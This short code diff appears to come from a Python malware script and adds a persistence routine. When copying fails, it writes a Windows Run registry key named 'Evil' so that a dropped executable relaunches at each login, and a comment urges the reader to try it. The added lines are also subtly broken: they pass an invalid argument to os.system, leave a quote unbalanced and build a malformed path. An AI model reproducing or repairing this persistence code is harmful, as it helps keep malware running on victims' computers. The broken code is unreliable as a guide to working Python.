@@ -37,6 +37,15 @@ class Reg:
 				copyfile(executable, self.malw_location)
 		except Exception as e:
 			print(e)
+			# and u can try add in registry
+			from os import system , environ
+			try:
+				system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d'+ self.malw_location +'"', shell=True)
+			except:
+				self.malw_location = environ["appdata"]+"anyname.exe"
+				system('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d'+ self.malw_location +'"', shell=True)
+			
+			
 De3vil = Reg()
 De3vil.startup()
 ```
